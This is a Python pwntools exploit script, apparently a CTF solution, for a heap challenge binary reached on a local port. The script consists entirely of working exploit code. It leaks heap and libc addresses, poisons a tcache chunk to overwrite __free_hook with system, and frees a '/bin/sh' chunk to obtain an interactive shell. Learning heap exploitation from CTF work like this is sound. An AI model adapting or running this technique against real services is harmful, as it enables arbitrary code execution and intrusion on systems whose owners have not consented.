from pwn import *

#p = process("./heap_chal")
p = remote("127.0.0.1",2250)
# context.terminal = ["tmux", "splitw", "-h"]
# gdb.attach(p, gdbscript="""
#                         continue
#                     """)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def add(id, len_name, name):
    p.sendlineafter("> ", "1")
    p.sendlineafter("id: \n", id)
    p.sendlineafter("length: \n", str(len_name))
    p.sendafter("name: \n", name)

def list_std():
    p.sendlineafter("> ", "2")

def update_grade(id, grade):
    p.sendlineafter("> ", "3")
    p.sendlineafter("id: \n", id)
    p.sendlineafter("grade: ", grade)

def update_name(id, name):
    p.sendlineafter("> ", "4")
    p.sendafter("id: \n", id)
    p.sendafter("name: \n", name)

def clear_std():
    p.sendlineafter("> ", "5")

def solve():
    add("a"*8, 0x500, "A"*0x500)
    add("b"*8, 0x10, "B"*0x10)
    clear_std()
    add("a"*8, 0, "")
    add("c"*8, 0, "")
    
    list_std()
    p.recvuntil("NAME: ")
    heap_base = u64(p.recv(6) + "\x00\x00") - 0x290
    p.recvuntil("NAME: ")
    libc.address = u64(p.recv(6) + "\x00\x00") -  0x1ec010
    system = libc.symbols["system"]
    free_hook = libc.symbols["__free_hook"]
    success("heap base: %s"%hex(heap_base))
    success("libc: %s"%hex(libc.address))

    add("b"*8, 0x10, "B"*0x10)
    add("d"*8, 0x10, "D"*0x10)
    clear_std()
    add("b"*8, 0x10, "B"*0x10)
    update_grade("b"*8, str(0xffffffffff))
    update_name("b"*8, "Z"*0x10 + p64(0) + p64(0x21) + p64(free_hook) + p64(0) + "\n")

    add("/bin/sh\x00", 0x10, p64(system) + "\n")
    clear_std()
    p.interactive()

if __name__ == "__main__":
    solve()
